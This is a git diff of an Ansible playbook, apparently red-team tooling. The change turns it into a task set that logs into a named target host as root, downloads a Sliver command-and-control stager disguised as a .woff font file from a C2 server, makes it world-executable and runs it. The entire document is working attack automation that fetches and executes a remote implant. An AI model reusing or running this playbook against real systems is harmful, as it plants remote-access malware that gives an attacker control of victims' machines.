@@ -1,23 +1,21 @@
 ---
-- name: Install and generate a Sliver beacon
-  hosts: localhost
+- name: Download and execute sliver implant/stager
+  hosts: "192.168.86.25"
   become: true
   vars:
     sliver_server_ip: "192.168.86.35" # SliverC2 IP
     sliver_server_port: 5555 # Sliver C2 server port
+    sliver_linux_stager: "COHERENT_DIARIST.woff"
 
   tasks:
-  
     - name: Download Sliver client via curl
-      ansible.builtin.shell: curl http://{{ sliver_server_ip }}:{{ sliver_server_port }} /*.woff --output stager.woff 
+      ansible.builtin.get_url:
+        url: http://{{ sliver_server_ip }}:{{ sliver_server_port }}/{{ sliver_linux_stager }}
+        dest: /home/target/
+        mode: 0777
       register: download_result
       retries: 3
       delay: 5
-      until: download_result.rc == 0
-
-    - name: Change permissions on file
-      ansible.builtin.file:
-        mode: 0777
 
     - name: Execute stager
-      ansible.builtin.shell: ./stager.woff
+      ansible.builtin.shell: ./{{ sliver_linux_stager }}
